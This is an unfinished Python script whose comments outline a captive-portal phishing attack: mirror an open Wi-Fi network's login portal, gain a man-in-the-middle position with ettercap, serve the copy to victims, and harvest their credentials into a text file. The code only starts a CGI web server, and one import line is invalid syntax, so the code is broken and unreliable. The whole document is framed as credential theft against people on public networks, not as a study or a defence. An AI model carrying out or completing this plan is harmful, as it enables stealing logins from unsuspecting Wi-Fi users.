#!/usr/bin/python3
# ok so the basics of captive portals and how to mirror them for mitm and
#   Credential stealing attacks.
#
#   1. you join an open wifi network
#   2. youre either immediatley sent to a page by firefox's detect portal
#        or everything redirects to the portal
#   3. download the portal
#   4. host the portal
#   5. establish MITM dominance via preferred methods (ettercap for testing)
#   6. serve the portal to people connecting to you
#   7. gather credentials from the submit so maybe a cgi wrapper is needed
#       or just a cgi callback (onsubmit. whatever the javascript is.)
#           - google "form submit to cgi python"
#   8.
#
#
#
#
import http.server import HTTPServer as Webserver
import http

#try:
#    from urllib.parse import urlparse
#except ImportError:
#    from urlparse import urlparse

try:
    import SocketServer as socketserver
except ImportError:
    import socketserver as socketserver

import cgitb
import cgi
import os

filename        = 'credentials.txt'
HOSTNAME        = 'hackbiscuits'
PORT            = 8765
url             = 'http://192.168.0.1/index.html'


def serveportal():
    httpd = Webserver((HOSTNAME, PORT), http.server.CGIHTTPRequestHandler)
    try:

        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
serveportal()
